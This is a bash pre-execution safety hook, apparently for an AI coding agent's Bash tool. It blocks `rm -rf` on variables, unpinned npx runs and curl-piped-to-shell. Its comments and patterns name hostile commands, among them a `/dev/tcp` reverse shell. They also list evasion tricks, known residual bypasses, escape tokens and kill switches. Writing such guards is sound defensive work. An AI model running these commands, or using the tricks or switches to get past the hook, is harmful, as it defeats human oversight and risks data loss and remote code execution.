#!/usr/bin/env bash
# pre-bash-safety-check.sh — PreToolUse:Bash hook.
# Denies dangerous Bash patterns enumerated in spec §8 SAFETY (immutable):
#   1. `rm -rf $VAR` / `rm -rf "$VAR"` / `rm -rf ${VAR}` — variable expansion
#      in the target without inline validation. Whitelists $HOME, $PWD,
#      $OLDPWD, $TMPDIR (always-set, low-blast vars). Also strips leading
#      wrappers before the check: env-assignments, env/command/nohup/setsid/time,
#      and flag-bearing sudo/doas/timeout/nice/stdbuf/ionice/chrt.
#   2. Fetch-execute package runner without a version pin AND not resolvable from
#      cwd's lockfile / node_modules — spec §8 NPX rule "lockfile → local →
#      pinned whitelist; none → [AUTH REQUIRED]". Covers `npx` / `npm exec` /
#      `bunx` / `pnpm dlx` / `yarn dlx` (`npm install` / `pnpm install` etc. are
#      not fetch-execute one-offs and stay excluded).
#   3. Network fetch piped/`<()`-substituted into a shell — spec §8 "execute
#      scripts of unknown origin": `curl|wget … | [sudo] sh/bash/…` or
#      `sh <(curl …)`. Local/literal sources and non-shell sinks stay allowed.
#
# Bypass:
#   (a) Per-invocation escape token in command:
#       [allow-rm-rf-var]   — bypasses pattern 1
#       [allow-npx-unpinned]— bypasses pattern 2
#       [allow-curl-sh]     — bypasses pattern 3
#   (b) Kill-switch: DISABLE_PRE_BASH_SAFETY_HOOK=1 (whole hook off)
#   (c) Global kill: DISABLE_CLAUDEMD_HOOKS=1
#
# Feature flags:
#   BASH_SAFETY_INDIRECT_CALL — indirect-exec coverage. **v0.21.8 default-ON**
#     (was opt-in default-OFF v0.6.0–v0.21.7 to gather FP signal; closes §8
#     SAFETY silent-bypass for `bash -c "rm -rf $X"` / `eval "rm -rf $X"`).
#     Set to `0` to opt out. Unwraps `bash -c '<inner>'` / `sh -c '<inner>'` /
#     `zsh -c '<inner>'` / `eval '<inner>'` (single OR double quoted) AND the
#     unquoted form `eval rm -rf $X` (bash joins eval's argv with spaces
#     before evaluating, so the unquoted form is execution-equivalent to the
#     quoted one — `bash -c` / `sh -c` / `zsh -c` are NOT the same because
#     they only treat their first non-flag arg as the script). Heuristic —
#     escaped quotes / heredoc forms / nested substitutions can defeat it.
#     Bypass tokens (a) survive unwrap so an authorized indirect call still
#     works with `[allow-rm-rf-var]` / `[allow-npx-unpinned]` inside the
#     inner string.

set -uo pipefail

LIB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib"
# shellcheck source=/dev/null
source "$LIB_DIR/hook-common.sh" || exit 0

hook_kill_switch PRE_BASH_SAFETY || exit 0
# Record fail-open on missing prereqs (roadmap OBS-1): a jq-less / malformed-stdin
# environment must not turn this §8 gate into a silent no-op the §13.1 audit reads
# as "never fired". banned-vocab-check.sh models the same contract.
if ! hook_require_jq; then
  hook_record_failopen pre-bash-safety jq-missing
  exit 0
fi

EVENT=$(hook_read_event)
if [[ -z "$EVENT" ]]; then
  hook_record_failopen pre-bash-safety bad-event
  exit 0
fi
TOOL=$(hook_jq_field pre-bash-safety "$EVENT" '.tool_name // ""') || exit 0
[[ "$TOOL" == "Bash" ]] || exit 0
CMD=$(printf '%s' "$EVENT" | jq -r '.tool_input.command // ""' 2>/dev/null)
[[ -n "$CMD" ]] || exit 0
# R-N5 readonly fast-path. **v0.20.0 default-ON** (§13.3 promotion from
# v0.8.3 opt-in default-OFF). When CMD is a definitely-read-only shape
# (no shell-meta, first token in safe-reader whitelist), exit before the
# sanitize/unwrap pipeline. This is the highest-leverage hook for the
# fast-path: sanitize_cmd + RM/NPX detectors run on EVERY Bash invocation
# in the steady-state hook config; readonly skip drops them entirely for
# `ls`, `cat /etc/foo`, `git log`, etc.
#
# Opt-out: BASH_READONLY_FAST_PATH=0 (any other value or unset → ON).
if [[ "${BASH_READONLY_FAST_PATH:-1}" != "0" ]] && hook_is_readonly_bash "$CMD"; then
  exit 0
fi

# Telemetry fields — see banned-vocab-check.sh for why these are below the
# fast-path exit rather than above it (audit-2026-08-22 条目 12). This hook is
# the one the comment above calls "the highest-leverage hook for the fast-path",
# which made two jq spawns in front of that exit the least defensible of the
# three. Gate: tests/hooks/preToolUse-fastpath-order.test.sh.
SESSION_ID=$(printf '%s' "$EVENT" | jq -r '.session_id // ""' 2>/dev/null)
TOOL_USE_ID=$(printf '%s' "$EVENT" | jq -r '.tool_use_id // ""' 2>/dev/null)

# Sanitize CMD before pattern matching: strip heredoc bodies, line comments, and
# quoted-string contents. The original regex matched on naive prefix class
# `[[:space:];&|`]` which fired on `npx`/`rm` *inside* string literals — see
# tests/hooks/pre-bash-safety.test.sh cases 29-36, 38 for the FP shapes
# observed during the 2026-04-30 cso audit (4 live reproductions in one session).
#
# Strip order matters:
#   1. Heredoc bodies (multi-line state, must run first to avoid downstream sed
#      lines stripping content of an unclosed heredoc)
#   2. Line comments
#   3. Quoted string contents
#
# What this does NOT change:
#   - Backtick command substitution (` ... `) — backticks ARE direct exec, so
#     `\`npx pkg\`` stays detectable
#   - $(...) command substitution — preserved (also direct exec)
#   - bash -c "..." / eval "..." — these were already FNs (the original prefix
#     class `[[:space:];&|`]` excluded `"` and `'`, so quoted-arg npx never matched).
#     Stripping quotes therefore does not weaken any case the original detected.
sanitize_cmd() {
  local raw="$1" out="" line
  local in_heredoc=0 heredoc_tag="" has_term j n
  # ['"]? = optional surround quote on tag (handles <<EOF, <<'EOF', <<"EOF").
  # \047 = single quote (octal); double quote can sit literally inside char class.
  # Group 1 captures the `-` of `<<-` (2026-07-27 audit, L1): only that form lets
  # the terminator be indented. Treating a plain `<<EOF` as terminated by an
  # INDENTED `EOF` — which bash reads as body text — stopped the strip early and
  # handed the rest of the real body to the detectors as commands. Same defect
  # and same fix as hook_strip_heredoc_bodies in hook-common.sh; the two
  # implementations are independent (this one is a char state machine that also
  # tracks quoting), so both had to be corrected.
  local heredoc_re=$'<<(-?)[[:space:]]*[\047"]?([[:alpha:]_][[:alnum:]_]*)[\047"]?'
  local heredoc_dash=""

  # Read into an array so the heredoc test can look ahead for a terminator.
  local -a lines=()
  while IFS= read -r line || [[ -n "$line" ]]; do lines+=("$line"); done <<< "$raw"
  n=${#lines[@]}

  local i
  for (( i=0; i<n; i++ )); do
    line="${lines[i]}"
    if (( in_heredoc )); then
      # Terminator: leading whitespace allowed ONLY for the `<<-` form (L1);
      # a plain `<<TAG` requires the tag at column 0, exactly as bash does.
      if [[ -n "$heredoc_dash" && "$line" =~ ^[[:space:]]*${heredoc_tag}[[:space:]]*$ ]] \
         || [[ -z "$heredoc_dash" && "$line" =~ ^${heredoc_tag}[[:space:]]*$ ]]; then
        in_heredoc=0; heredoc_tag=""; heredoc_dash=""
      fi
      out+=$'\n'
      continue
    fi
    if [[ "$line" =~ $heredoc_re ]]; then
      heredoc_dash="${BASH_REMATCH[1]}"
      heredoc_tag="${BASH_REMATCH[2]}"
      # Only a REAL heredoc if a matching terminator line exists later. `heredoc_re`
      # matches any `<<word`, but `<<` is also a left-shift operator ($((a<<b)),
      # $[a<<b], `let a<<b`), sits inside quoted strings (`echo "a<<b"`), and
      # appears in comparison prose — none of which is a redirection. Treating those
      # as a heredoc set in_heredoc=1, truncated the line at `<<`, and blanked every
      # following line, deleting the rm/npx/curl after it from the text ALL three
      # detectors scan → §8 silent bypass (D2 + 2026-07-15 fresh-review findings).
      # A genuine heredoc always closes with its tag on its own line; a shift /
      # quoted `<<` / comparison never does. Requiring the terminator can ONLY make
      # us treat FEWER things as heredocs → expose MORE text to the deny-on-match
      # detectors → never a new bypass, at worst a false-deny on a terminator-less
      # body (which is not a runnable command anyway). This closes the whole
      # "arithmetic/quoted `<<` fakes a heredoc" class without enumerating syntaxes.
      # heredoc_tag is a clean identifier ([[:alpha:]_][[:alnum:]_]*), so
      # interpolating it into the terminator regex carries no metacharacter risk.
      # KNOWN RESIDUAL (deliberate-crafting, same class as the indirect-rebind note
      # below; not closed): a FAKE heredoc whose tag name is then repeated as its own
      # bare line — `echo $((1<<n))\nrm -rf $EVIL\nn` — acquires a coincidental
      # terminator and blanks the rm. This predates this guard (the original blanked
      # it too, with no terminator required) and requires appending a line equal to
      # the shift variable, which bash then runs as a failing command. It does not
      # clear the "ordinary mistake" bar, so it is not chased here.
      has_term=0
      for (( j=i+1; j<n; j++ )); do
        if [[ -n "$heredoc_dash" && "${lines[j]}" =~ ^[[:space:]]*${heredoc_tag}[[:space:]]*$ ]] \
           || [[ -z "$heredoc_dash" && "${lines[j]}" =~ ^${heredoc_tag}[[:space:]]*$ ]]; then has_term=1; break; fi
      done
      if (( has_term )); then
        in_heredoc=1
        # Excise ONLY the `<<TAG` token, keeping both sides (F33, v0.62.0 pre-tag
        # review). This used to be `line="${line%%<<*}"`, which threw away
        # everything after the introducer — but bash runs the tail of
        # `cat <<EOF && rm -rf $VAR`, so all three gates went blind on a segment
        # they deny without the heredoc (control verified). hook_strip_heredoc_bodies
        # has done it this way since v0.58.0 and its header names this exact defect
        # as one it fixed for the memory-read copy; this state machine never got it.
        _hd_tok="${BASH_REMATCH[0]}"
        line="${line%%"$_hd_tok"*}${line#*"$_hd_tok"}"
      else
        heredoc_tag=""; heredoc_dash=""
      fi
    fi
    out+="$line"$'\n'
  done

  # Strip contents of paired quoted strings, keeping the empty-quote markers
  # so token boundaries (e.g. `echo ""` after stripping) are preserved.
  #
  # ONE state machine walks both quote types (v0.47.1). Single- and double-quote
  # context are mutually exclusive in the shell — a `'` inside "..." is a literal
  # apostrophe, a `"` inside '...' is a literal quote — so they cannot be stripped
  # in two independent passes. Pre-fix the single-quote pass was a line-based sed
  # `s/'[^']*'/''/g` that ran FIRST, blind to double-quote context, giving two
  # defects:
  #   - §8 SILENT BYPASS: `echo "it's fine" && rm -rf $X && echo "don't"` — the
  #     apostrophes in `it's` and `don't` paired, eating `&& rm -rf $X &&`, so the
  #     rm-detector saw no rm at all → ALLOW. Identical failure mode to the
  #     double-quote regex bug below, which was fixed with a state machine while
  #     the single-quote sed was left as a regex (2026-07-15 repro).
  #   - FALSE DENY: sed is line-based, so a multi-line '...' literal
  #     (`python -c 'print(1)\nrm -rf $X'`) kept its body and false-denied.
  #     RS="\004" reads the whole buffer, so multi-line bodies now strip.
  # The double-quote regex `"[^"$]*"` this replaced was itself a §8 bypass: it
  # could pair the closing `"` of one $-containing string with the opening `"` of
  # the next, eating `&& rm -rf` between them (`echo "$A" && rm -rf "$B"` →
  # `echo "$A""$B"`). Walking char-by-char keeps adjacent quoted regions distinct.
  #
  # Body handling, per quote type:
  #   '...'  → simple literal word ([A-Za-z0-9_./-]+) → UNWRAP to the bare word;
  #            anything else → drop to `''` (no shell expansion inside singles)
  #   "..."  → body has `$` → preserve verbatim (real var expansion / command sub)
  #            simple literal word → UNWRAP to the bare word
  #            anything else → replace with empty `""`
  #   empty pair (`""`/`''`) → DROP when adjacent to a word or quote char on
  #            either side (it glues word halves: `ba""sh` execs bash); KEEP the
  #            marker when standalone (`echo ""` token boundary preserved).
  # The unwrap + adjacent-drop close the quoted/split command-word §8 bypass
  # (2026-07-17 audit F1): `"rm" -rf $X`, `r""m`, `ba''sh`, `curl x | "bash"`
  # previously canonicalized to `""`/`ba''sh` and matched NO gate, while the
  # shell execs rm/bash. The shell strips quotes at exec time, so unwrapping a
  # LITERAL word can only EXPOSE tokens the shell would run — never hide one
  # (same monotonic argument as canon_cmd_words). Quoted bodies with spaces /
  # `$` / metachars keep today's treatment, so phrases (`-m "fix rm usage"`)
  # still strip and never false-deny.
  # Unterminated quote → keep the body verbatim: exposing text to a deny-on-match
  # detector can only false-DENY, never bypass. Escape sequences (`\"` inside
  # "...") are not modeled — pre-existing gap, not in scope. KNOWN RESIDUAL
  # (deliberate double-evasion, same bar as the heredoc note above): a quoted
  # RUNNER before an indirect payload (`"bash" -c 'rm -rf $X'`) unwraps only
  # AFTER unwrap_indirect already ran, so the payload stays stripped — the
  # combo is not chased here.
  out=$(printf '%s' "$out" | awk '
    BEGIN { RS = "\004"; WORDC = "[A-Za-z0-9_./-]" }
    # close_quote(body, marker): emit for one terminated quoted region.
    #   simple literal word → the bare word (shell strips quotes at exec time);
    #   empty body → drop entirely when glued to a word/quote char on either
    #   side (`ba""sh`), keep the marker when standalone (`echo ""`);
    #   anything else → the empty marker (existing stripping).
    function close_quote(body, marker, prevch, nextch) {
      if (body ~ ("^" WORDC "+$")) return body
      if (body == "" && (prevch ~ WORDC || nextch ~ WORDC \
                         || prevch == "\047" || prevch == "\"" \
                         || nextch == "\047" || nextch == "\"")) return ""
      return marker
    }
    {
      n = length($0)
      st = 0; buf = ""; has_dollar = 0; final = ""
      for (i = 1; i <= n; i++) {
        ch = substr($0, i, 1)
        if (st == 0) {
          if (ch == "\047") { st = 1; buf = "" }
          else if (ch == "\"") { st = 2; buf = ""; has_dollar = 0 }
          else final = final ch
        } else if (st == 1) {
          if (ch == "\047") {
            final = final close_quote(buf, "\047\047", substr(final, length(final), 1), substr($0, i+1, 1))
            st = 0; buf = ""
          }
          else buf = buf ch
        } else {
          if (ch == "\"") {
            if (has_dollar) { gsub(/#/, "", buf); final = final "\"" buf "\"" }
            else final = final close_quote(buf, "\"\"", substr(final, length(final), 1), substr($0, i+1, 1))
            st = 0; buf = ""; has_dollar = 0
          } else if (ch == "$") {
            has_dollar = 1; buf = buf ch
          } else {
            buf = buf ch
          }
        }
      }
      if (st == 1)      { gsub(/#/, "", buf); final = final "\047" buf }
      else if (st == 2) { gsub(/#/, "", buf); final = final "\"" buf }
      printf "%s", final
    }
  ')

  # Strip line comments LAST (# at line start or after whitespace, to end of
  # line). Must run AFTER the quote strips: pre-v0.23.11 the comment strip ran
  # first, so a `#` sitting inside a quoted string but preceded by whitespace
  # (`git commit -m 'msg # note' && rm -rf $X`) was mistaken for a real comment,
  # deleting the chained `&& rm -rf $X` before the detector saw it — a §8 SAFETY
  # bypass. By this point single-quoted bodies are `''`, $-less double-quoted
  # bodies are `""`, and `#` inside preserved $-double-quoted bodies has been
  # gsub'd out above, so any surviving `#` is a genuine unquoted comment.
  out=$(printf '%s' "$out" | sed -E 's/(^|[[:space:]])#.*$/\1/')

  printf '%s' "$out"
}

# Canonicalize the command-position leading word of every segment: strip a
# leading backslash (alias-defeat `\npx`) and a path prefix (`/usr/bin/npx`),
# leaving the basename the shell actually EXECs. Only the FIRST token after a
# true command separator (^ ; & | ( { backtick newline) is touched — NEVER a
# plain-space-preceded argument — so `echo foo/npx bar` is untouched (foo/npx is
# an arg, not a command). This gives the npx/curl gates the same command-name
# awareness the rm gate's token loop already has (2026-07-13 SEC-2; SEC-1 v0.39.0
# basenamed the rm gate only, leaving \npx / /usr/bin/npx and \curl / path-curl
# evading). The shell resolves these to npx/curl/sh at exec time, so
# canonicalizing can only EXPOSE deny tokens the shell would run, never hide one.
#
# Leading env-var ASSIGNMENTS (`DEBUG=1`, `PREFIX=/opt/app`) sit at command
# position but are NOT command names — basenaming them destroys the assignment
# and reopens the §8 bypass the rm/npx gates' own assignment-strip loops close.
# Repro (2026-07-15): `DEBUG=/tmp/x rm -rf $EVIL` canon'd to `x rm -rf $EVIL`, so
# the strip loop broke at `x`, rm_canon != rm, and the whole segment was skipped
# — ALLOW. `DEBUG=1` (no slash) was unaffected, which is why the class survived
# SEC-2 review. Emit assignments verbatim and KEEP cmdpos=1: the real command
# word follows, and it still gets canonicalized (`FOO=/a/b /usr/bin/npx pkg` →
# `FOO=/a/b npx pkg`).
canon_cmd_words() {
  printf '%s' "$1" | awk '
    {
      s=$0; out=""; n=length(s); i=1; cmdpos=1
      while (i<=n) {
        ch=substr(s,i,1)
        if (cmdpos && ch!=" " && ch!="\t") {
          word=""
          while (i<=n) {
            ch=substr(s,i,1)
            if (ch==" "||ch=="\t"||ch==";"||ch=="&"||ch=="|"||ch=="("||ch=="{"||ch=="`") break
            word=word ch; i++
          }
          # `+=` is an assignment too (`D+=/x cmd` is a valid prefix assignment).
          # Excluding it made canon basename `D+=/../../etc` to `etc`, erasing the
          # bare `D` mention that the rm rebind guard counts — a mktemp-provenance
          # bypass (2026-07-25 adversarial review). Emitting verbatim exposes more
          # text to the detectors, never less. NOTE: this awk body is inside a
          # single-quoted shell string — no apostrophes in these comments.
          if (word ~ /^[A-Za-z_][A-Za-z0-9_]*\+?=/) { out=out word; continue }
          # F25: a REDIRECTION may sit at command position (`>/tmp/log rm -rf $V`).
          # Basename-canonicalizing it destroyed the operator and left a bare word
          # (`>/tmp/log` became `log`), which then read as the command word and hid
          # the real one from every gate. Emit verbatim and stay at command position
          # so the NEXT word is the one canonicalized.
          if (word ~ /^[0-9]*[<>]/) { out=out word; continue }
          sub(/^\\/,"",word); sub(/.*\//,"",word)
          out=out word; cmdpos=0; continue
        }
        out=out ch
        # `{` re-opens command position ONLY as a brace-group introducer (`{ rm; }`).
        # `${VAR}` parameter expansion also contains `{`, but there the `{` is
        # preceded by `$` and is NOT a command boundary — treating it as one made
        # canon read the post-`{` text as a command word and basename it, so
        # `rm -rf "${SP}/build"` became `rm -rf "${build"`, erasing the `${SP}`
        # the var-detector greps for → §8 silent bypass (D1, 2026-07-15). Guard
        # the `{` case on the preceding char not being `$`. `(`/backtick still
        # open command position ($(...) / `...` genuinely hold a command).
        if (ch==";"||ch=="&"||ch=="|"||ch=="("||ch=="`") cmdpos=1
        else if (ch=="{" && substr(s,i-1,1)!="$") cmdpos=1
        i++
      }
      print out
    }'
}

# Indirect-call unwrap (opt-in v0.6.0).
# Order: unwrap BEFORE sanitize. Sanitize strips single-quoted bodies entirely
# and double-quoted bodies w/o `$`; once we unwrap, the inner sits as a
# top-level token so sanitize then handles legit echo/heredoc/comment shapes
# normally. Anchored to the same prefix class as the detectors (^|[[:space:];&|`(])
# so `cmd && bash -c '...'` and `$(bash -c '...')` both match, but
# `echo "bash -c 'rm -rf $X'"` (where the bash sits behind `"`) does not.
unwrap_indirect() {
  local s="$1"
  # `-c` is matched as a flag BUNDLE ending in (or containing) `c`, optionally
  # preceded by other flag tokens: `bash -c`, `bash -lc`, `bash -xc`,
  # `sh -lc`, `bash --norc -c`, `bash -x -c` all run the next arg as a shell
  # command, so all must be unwrapped. Pre-v0.23.11 only the bare `-c` form
  # was matched — `bash -lc 'rm -rf $X'` was a §8 SAFETY silent bypass. The
  # `([[:space:]]+-[a-zA-Z-]+)*` group eats leading flags; the required
  # `-[a-zA-Z]*c[a-zA-Z]*` is the bundle that consumes the command string.
  # Shell set = the Bourne family whose `-c "<cmd>"` execs the arg identically:
  # bash/sh/zsh + dash/ksh/ash. v0.23.17 added dash/ksh/ash — `dash` is the
  # Debian/Ubuntu default `/bin/sh`, so `dash -c 'rm -rf $X'` was a §8 bypass on
  # the most common CI/server platform; covering the whole family closes the
  # class rather than the one instance. Each name is separator-anchored
  # (`(^|[[:space:];&|\`(])`) so it never matches inside a longer word
  # (`dashboard`, `stash`). csh/tcsh excluded — different `-c` quoting + rare.
  s=$(printf '%s' "$s" | sed -E "s/(^|[[:space:];&|\`(])(bash|sh|zsh|dash|ksh|ash)([[:space:]]+-[a-zA-Z-]+)*[[:space:]]+-[a-zA-Z]*c[a-zA-Z]*[[:space:]]+'([^']*)'/\\1; \\4 ;/g")
  s=$(printf '%s' "$s" | sed -E "s/(^|[[:space:];&|\`(])(bash|sh|zsh|dash|ksh|ash)([[:space:]]+-[a-zA-Z-]+)*[[:space:]]+-[a-zA-Z]*c[a-zA-Z]*[[:space:]]+\"([^\"]*)\"/\\1; \\4 ;/g")
  s=$(printf '%s' "$s" | sed -E "s/(^|[[:space:];&|\`(])eval[[:space:]]+'([^']*)'/\\1; \\2 ;/g")
  s=$(printf '%s' "$s" | sed -E "s/(^|[[:space:];&|\`(])eval[[:space:]]+\"([^\"]*)\"/\\1; \\2 ;/g")
  # Unquoted eval form: `eval rm -rf $X` — bash collapses the words with
  # spaces and evaluates the result, so this is execution-equivalent to
  # `eval "rm -rf $X"`. Without this rule, the quoted-only unwrap above is
  # a §8 SAFETY silent bypass — an attacker just drops the quotes. Inner
  # capture group stops at the next command terminator (`;`, `&`, `|`) so
  # `eval rm -rf $X && ls` still treats `ls` as its own segment. Leading
  # char of the inner must not be `'`/`"` (quoted forms above already
  # handled) so a same-line `eval "..."` further down the buffer is not
  # double-unwrapped.
  s=$(printf '%s' "$s" | sed -E "s/(^|[[:space:];&|\`(])eval[[:space:]]+([^'\"[:space:];&|][^;&|]*)/\\1; \\2 ;/g")
  printf '%s' "$s"
}

# EVENT_CWD: per spec §8 NPX rule, the lockfile/local resolution check needs
# the directory the bash command will run in. CC's bash hook event includes
# `.cwd`. Empty/missing → npx_pkg_locally_resolved fails closed (deny).
EVENT_CWD=$(printf '%s' "$EVENT" | jq -r '.cwd // ""' 2>/dev/null)

# npx_pkg_locally_resolved PKG CWD
#   Returns 0 (true) if PKG can be resolved from CWD without a registry hit,
#   per spec §8 NPX rule "lockfile → local → pinned". Two checks:
#     1. CWD/node_modules/<pkg>/ exists (covers @scope/pkg via slash literal).
#     2. CWD lockfile mentions pkg in its native key form.
#   Conservative — false negatives just preserve the existing deny, false
#   positives would allow an attacker who can plant a lockfile entry but not
#   install (acceptable: planting a lockfile already requires write access).
npx_pkg_locally_resolved() {
  local pkg="$1" cwd="$2"
  [[ -n "$cwd" && -d "$cwd" ]] || return 1
  [[ -d "$cwd/node_modules/$pkg" ]] && return 0
  local lockfile
  for lockfile in package-lock.json npm-shrinkwrap.json; do
    [[ -f "$cwd/$lockfile" ]] || continue
    grep -qF "\"node_modules/$pkg\"" "$cwd/$lockfile" 2>/dev/null && return 0
  done
  if [[ -f "$cwd/pnpm-lock.yaml" ]]; then
    grep -qE "(^|[[:space:]])/${pkg}@" "$cwd/pnpm-lock.yaml" 2>/dev/null && return 0
  fi
  if [[ -f "$cwd/yarn.lock" ]]; then
    grep -qE "^[\"']?${pkg}@" "$cwd/yarn.lock" 2>/dev/null && return 0
  fi
  return 1
}

# effective_npx_cwd BASE FLAT
#   CC's event `.cwd` is the shell cwd *before* the command runs. When the
#   command prefixes a `cd <dir>` (e.g. `cd frontend && npx vue-tsc` in a
#   monorepo whose tool is a devDependency of frontend/), npx actually runs in
#   BASE/<dir>, not BASE — so npx_pkg_locally_resolved against BASE alone
#   false-denies a locally-installed tool. Observed 5× on the daagu
#   frontend/backend monorepo. Walk the `cd` commands that appear BEFORE the
#   first `npx ` token and apply each to a running cwd via subshell `cd`
#   (resolves relative / absolute / `..` against the real filesystem).
#
#   Safety: only ALLOWS when a real local install exists at the composed path,
#   so this can never weaken the gate — at worst it allows an npx whose package
#   is genuinely installed in the cd'd dir (the intended allow). Targets with
#   shell expansion (`$VAR` / backtick / glob / `~`) or a failed `cd` are
#   unresolvable, so we bail to BASE (keeping the conservative deny).
#
#   The cd-extractor anchor class includes `(` / `{` so the SUBSHELL form
#   `(cd sub && npx tool)` — the idiom for "cd without disturbing the caller's
#   cwd" — is followed like the bare `cd sub && npx tool` form. Pre-fix the class
#   was `(^|[[:space:];&|])`: `(cd` matched neither `^` nor a listed separator, so
#   the cd was invisible, eff fell back to BASE, and a package installed only in
#   the subdir false-DENIED (2026-07-15 repro on the daagu monorepo:
#   `(cd frontend && npx vue-tsc)` denied with vue-tsc present in
#   frontend/node_modules). The rm gate + npx segment splitter already treat
#   `(`/`{` as separators; this extractor was the odd one out. The target class
#   excludes `)`/`}` so `(cd sub)` yields `sub`, not `sub)`.
effective_npx_cwd() {
  local base="$1" flat="$2" target resolved
  local eff="$base"                       # separate stmt: `local a=.. b="$a"` is unbound under set -u
  local before="${flat%%npx *}"          # cd's after npx don't affect its cwd
  while read -r target; do
    [[ -z "$target" ]] && continue
    case "$target" in
      *'$'*|*'`'*|*'*'*|*'?'*|'~'*|-*) eff="$base"; break ;;  # unresolvable: keep base
    esac
    if [[ "$target" == /* ]]; then
      resolved=$(cd "$target" 2>/dev/null && pwd)
    else
      resolved=$(cd "$eff" 2>/dev/null && cd "$target" 2>/dev/null && pwd)
    fi
    if [[ -n "$resolved" ]]; then eff="$resolved"; else eff="$base"; break; fi
  done < <(printf '%s\n' "$before" \
    | grep -oE '(^|[[:space:];&|({])cd[[:space:]]+[^[:space:];&|(){}]+' \
    | sed -E 's/.*cd[[:space:]]+//')
  printf '%s' "$eff"
}

# Normalize shell-lexer evasions BEFORE unwrap/sanitize/tokenize (v0.39.0 §8 FN
# closure, 2026-07-12 audit F2/F3). The detectors below match SOURCE TEXT, so an
# attacker can hide a danger token from them with lexer tricks the shell itself
# transparently undoes at exec time:
#   - ${IFS}/$IFS word-split (F2): `rm${IFS}-rf${IFS}$X`, `npx${IFS}pkg` — fold to
#     a space so the token loop sees `rm -rf $X` / `npx pkg`. Bare `$IFS` is only
#     folded when NOT followed by an identifier char (so `$IFSFOO` = var IFSFOO is
#     untouched).
#   - backslash-newline continuation (F3): `rm -r\<newline>f $X` — bash joins the
#     line, so remove `\`+newline (portable bash 3.2 param-expansion, not sed `\n`
#     which is non-portable on BSD).
# Folding can only EXPOSE tokens the shell would see, never hide one, so it
# strictly closes false-negatives on these deny-on-match detectors.
_nl=$'\n'
NORMALIZED_CMD="${CMD//\\$_nl/}"
# Fold ${IFS}/$IFS word-splitting to a space. The braced ${IFS} form is a plain
# global replace, but the bare-$IFS sed `s/\$IFS([^A-Za-z0-9_]|$)/ \1/` CONSUMES
# the trailing delimiter into the backref, so an ADJACENT `$IFS$IFS` leaves the
# second unfolded after one pass (2026-07-13 SEC-2 F6). Run the bare form to a
# FIXED POINT — folding only ever removes `$IFS`, so it decreases monotonically
# and terminates.
# shellcheck disable=SC2016  # single quotes intentional: sed must see $IFS literally
NORMALIZED_CMD=$(printf '%s' "$NORMALIZED_CMD" | sed -E 's/\$\{IFS\}/ /g')
while :; do
  # shellcheck disable=SC2016  # single quotes intentional: sed must see $IFS literally
  _folded=$(printf '%s' "$NORMALIZED_CMD" | sed -E 's/\$IFS([^A-Za-z0-9_]|$)/ \1/g')
  [[ "$_folded" == "$NORMALIZED_CMD" ]] && break
  NORMALIZED_CMD="$_folded"
done

PROCESSED_CMD="$NORMALIZED_CMD"
if [[ "${BASH_SAFETY_INDIRECT_CALL:-1}" != "0" ]]; then
  PROCESSED_CMD=$(unwrap_indirect "$NORMALIZED_CMD")
fi
# Unwrap quotes around a SINGLE bare token before sanitizing (2026-07-28 review).
# sanitize_cmd blanks quoted BODIES, which is right for prose but wrong when the
# quoted thing IS the argument a gate reads: `pip install "git+https://…"` and
# `go run "pkg@latest"` and `deno run "https://…"` all measured ALLOW while their
# unquoted twins denied — and quoting is the DOCUMENTED pip spelling once the URL
# carries `#egg=` or `[extras]`, so this was not evasion, it was the normal way to
# write it. Only quote pairs containing no whitespace, no command separator and no
# other quote are unwrapped, which is what keeps prose safe: `-m "fix; pip install
# git+https://x"` still has spaces and a `;`, so it stays quoted and sanitize blanks
# it as before, and no segment boundary can be manufactured out of a quoted string.
# Excluding the other quote char matters too — unwrapping `"don't"` would leave a
# stray apostrophe for the quote state machine to trip over (the F11 class).
UNWRAPPED_CMD="$PROCESSED_CMD"
PROCESSED_CMD=$(printf '%s' "$PROCESSED_CMD" \
  | sed -E 's/"([^"'"'"'[:space:];&|]*)"/\1/g' \
  | sed -E "s/'([^'\"[:space:];&|]*)'/\1/g")
# Dedicated view for the reverse-shell transports (3c). They need the OPPOSITE
# trade from every other gate here: quoted prose must be invisible (so a commit
# message naming /dev/tcp does not deny) but REDIRECTS must survive — and
# sanitize_cmd strips redirect tokens, which silently swallowed the canonical
# `bash -i >& /dev/tcp/h/p 0>&1` when 3c first moved off the raw text. The shared
# hook_trigger_view empties quoted bodies and touches nothing else, so it is
# exactly this view; built from the pre-unquote text so the single-token unquote
# above cannot re-expose `rg "/dev/tcp/…"` as if it were a redirect target.
REVSH_VIEW=$(printf '%s' "$UNWRAPPED_CMD" | hook_trigger_view)
SANITIZED_CMD=$(sanitize_cmd "$PROCESSED_CMD")
# Canonicalize command-position words (\npx → npx, /usr/bin/npx → npx) so the
# npx/curl gates below match what the shell EXECs — sibling parity with the rm
# gate's own basename step (2026-07-13 SEC-2 F5).
SANITIZED_CMD=$(canon_cmd_words "$SANITIZED_CMD")
# Escape markers must not change the PARSE (2026-07-28). Every bypass flag is read
# from the raw $CMD, so the marker's only remaining effect on the sanitized text is
# accidental — and it is not harmless: with the interpreter sinks added this release,
# `curl … | python3` denies but `curl … | python3 [allow-curl-sh]` did not even
# TRIGGER, because a trailing `[` is not the end-of-command the strict interpreter
# boundary requires. Same visible outcome as a bypass, no bypass row — an ALLOW that
# leaves no trace, which is the exact failure this release's telemetry work exists to
# remove. Stripping cannot create a false deny: it only removes tokens whose presence
# already set the corresponding bypass flag.
SANITIZED_CMD=$(printf '%s' "$SANITIZED_CMD" | sed -E 's/\[(allow|skip)-[a-z0-9-]+\]//g')
# Multi-line collapse for pattern-extraction sed passes. Without this, the
# downstream `s/.*${RM_FLAG_REGEX}//` / `s/.*${NPX_REGEX}//` operate per-line:
# lines without `rm`/`npx` pass through unchanged, then `head -n1` (rm path)
# or `for tok in $tail` (npx path) reads tokens from those unrelated lines.
# Two opposite-direction failures:
#   - false-ALLOW (CRITICAL): `TMP=$(mktemp -d)\nrm -rf $UNSAFE_VAR` — head -n1
#     returns the mktemp line (no rm content), rm_target empty, deny path
#     never fires. §8 SAFETY bypass.
#   - false-DENY: `TMP=$(mktemp -d)\nnpx prettier@3.0.0` — npx_tail starts with
#     `TMP=$(mktemp`, flagged as unpinned package. Innocent script denied.
# Sanitize already stripped heredoc bodies / line comments / quoted bodies, so
# the remaining newlines are between independent command lines — replacing with
# spaces is safe (heredoc-body content can't leak in).
SANITIZED_CMD_FLAT=$(printf '%s' "$SANITIZED_CMD" | tr '\n' ' ')

# Shared §8 wrapper taxonomy (single source; consumed by the rm + npx segment
